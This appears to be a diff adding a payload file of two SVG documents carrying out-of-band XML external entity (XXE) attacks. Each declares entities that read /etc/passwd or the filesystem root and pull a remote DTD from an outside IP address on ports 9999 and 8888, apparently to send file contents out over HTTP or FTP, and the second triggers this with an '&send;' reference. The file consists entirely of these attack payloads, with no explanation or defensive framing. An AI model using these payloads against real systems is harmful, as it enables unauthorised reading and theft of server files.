@@ -1,0 +1,18 @@
+<!DOCTYPE foo [ 
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+ <!ENTITY % dtd SYSTEM "http://192.99.71.144:9999/remote.dtd"> 
+%dtd;]>
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="12cm" height="12cm">
+
+</svg>
+
+
+<!DOCTYPE foo [ 
+ <!ENTITY % file SYSTEM "file:///">
+ <!ENTITY % dtd SYSTEM "http://192.99.71.144:8888/remote_ftp.dtd"> 
+%dtd;]>
+<svg xmlns="http://www.w3.org/2000/svg" width="12cm" height="12cm">
+    <text>Hello&send;</text>
+</svg>
+
